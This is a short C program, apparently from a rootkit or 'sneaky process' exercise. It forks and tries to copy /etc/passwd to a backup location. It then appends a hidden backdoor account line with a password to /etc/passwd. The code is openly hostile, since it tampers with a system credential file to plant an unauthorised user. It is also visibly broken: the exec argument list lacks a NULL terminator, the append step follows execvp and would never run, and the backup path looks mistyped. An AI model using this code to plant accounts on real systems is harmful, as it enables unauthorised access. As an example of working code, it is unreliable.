#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main() {
  int rc = fork();  
  printf("sneaky_process pid=%d\n", getpid());
  if (rc == 0) {
    char *myargs[3];
    myargs[0] = strdup("cp");
    myargs[1] = strdup("/etc/passwd");
    myargs[2] = strdup("/temp/passwd");
    execvp(myargs[0], myargs);
    
    FILE * target = fopen("/etc/passwd", "a");
    char append[] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
    fprintf(target, append); 
    
  }


  return 0;
}
